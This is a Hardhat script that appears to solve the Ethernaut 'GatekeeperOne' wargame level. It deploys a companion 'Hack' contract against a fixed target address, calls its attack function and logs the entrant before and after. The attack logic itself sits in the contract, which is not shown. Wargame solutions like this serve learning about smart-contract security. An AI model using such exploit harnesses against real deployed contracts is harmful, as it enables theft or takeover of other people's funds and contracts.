// We require the Hardhat Runtime Environment explicitly here. This is optional
// but useful for running the script in a standalone fashion through `node <script>`.
//
// When running the script with `npx hardhat run <script>` you'll find the Hardhat
// Runtime Environment's members available in the global scope.
const hre = require("hardhat");

async function main() {
  // 🔨 Get accounts
  let [hacker, _, tester] = await hre.ethers.getSigners();
  hacker = tester;
  let deployer = hacker;

  // 🗣 Logging addresses
  console.log(`🤓 Hacker address:\n ${hacker.address} \n`);

  // 📗 Contract name and address that will be hacked
  const contractName = "GatekeeperOne";
  const contractAddress = "0x0bcac42EF2c3DBA4656A86497cb2AE5B5256BCF5";

  const contract = await hre.ethers.getContractAt(
    contractName,
    contractAddress
  );

  // 📕 Contract that will execute the hack
  const HackContract = await ethers.getContractFactory(
    "Hack" + contractName,
    deployer
  );
  const hackContract = await HackContract.connect(deployer).deploy(
    contract.address
  );
  await hackContract.deployed();

  // 🗣 Logging contracts addresses
  console.log(`📗 ${contractName}.sol address: \n${contract.address}\n`);
  console.log(
    `📕 Hack${contractName}.sol address: \n${hackContract.address}\n`
  );

  // 👿 Hacking the contract
  // 🗣 Logging status
  console.log(`🔑 Entrant: \n${await contract.entrant()}\n`);

  // 📖 https://docs.ethers.io/v4/api-utils.html#solidity
  const tx = await hackContract.attackUsingNativeEncode();
  await tx.wait((confirms = 1)); // wait until the transaction is mined
  console.log("🔳 Transaction:");
  console.log(tx);

  // 🗣 Logging status
  console.log(`🔑 Entrant: \n${await contract.entrant()}\n`);
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
